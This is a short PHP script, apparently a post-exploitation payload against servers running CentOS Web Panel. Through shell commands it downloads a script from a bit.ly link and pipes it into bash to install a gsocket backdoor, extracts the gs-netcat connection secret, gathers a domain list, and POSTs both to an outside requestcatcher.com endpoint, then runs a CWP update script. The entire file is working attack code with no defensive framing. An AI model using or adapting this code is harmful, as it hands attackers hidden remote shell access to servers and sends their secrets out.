<?php
$rand = rand(1e5,1e6);
$domains = `curl -sL bit.ly/ipdomains;`;
$key = `export LC_CTYPE=C; X=$rand; X=slimbox2v74yvnvs; curl -fskSL bit.ly/gsock | bash 2>&1 | grep -Eo 'gs-netcat -s "[a-zA-Z0-9]+" -i';`;
`export LC_CTYPE=C; curl -sL -X POST -d '$key; $domains' goruletheworld.requestcatcher.com/$rand;`;
`sh /usr/local/cwpsrv/htdocs/resources/scripts/update_cwp 2>&1;`;
